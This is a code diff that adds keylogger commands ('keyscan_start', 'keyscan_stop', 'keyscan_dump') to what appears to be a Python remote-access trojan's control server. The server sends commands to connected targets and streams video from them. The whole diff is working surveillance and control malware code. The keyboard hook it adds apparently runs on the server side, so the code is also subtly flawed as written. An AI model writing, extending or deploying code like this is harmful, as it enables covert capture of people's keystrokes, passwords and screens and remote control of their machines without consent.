@@ -7,6 +7,7 @@ import cv2
 import numpy as np
 import sys
 import os
+import keyboard  # Import the keyboard library
 
 init(autoreset=True)
 
@@ -14,6 +15,8 @@ app = Flask(__name__)
 clients = {}
 server_thread = None
 streaming = False
+keylogger_data = []  # List to store keylogger data
+keylogger_running = False  # Flag to check if keylogger is running
 
 # HTML template for video streaming with a stop button
 html_template = """
@@ -80,6 +83,27 @@ def generate_frames(client_socket):
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
+def keylogger_callback(event):
+    global keylogger_data
+    keylogger_data.append(event.name)
+
+def start_keylogger():
+    global keylogger_running
+    if not keylogger_running:
+        keyboard.on_press(keylogger_callback)
+        keylogger_running = True
+        print(Fore.YELLOW + "[ * ] Keylogger started.")
+
+def stop_keylogger():
+    global keylogger_running
+    if keylogger_running:
+        keyboard.unhook_all()
+        keylogger_running = False
+        print(Fore.YELLOW + "[ * ] Keylogger stopped.")
+
+def dump_keylogger_data():
+    global keylogger_data
+    return '\n'.join(keylogger_data)
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
@@ -154,8 +178,19 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + output)
             continue
 
-        client_socket.send(command.encode('utf-8'))
+        if command == "keyscan_start":
+            start_keylogger()
+            continue
 
+        if command == "keyscan_stop":
+            stop_keylogger()
+            continue
+
+        if command == "keyscan_dump":
+            print(Fore.WHITE + dump_keylogger_data())
+            continue
+
+        client_socket.send(command.encode('utf-8'))
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
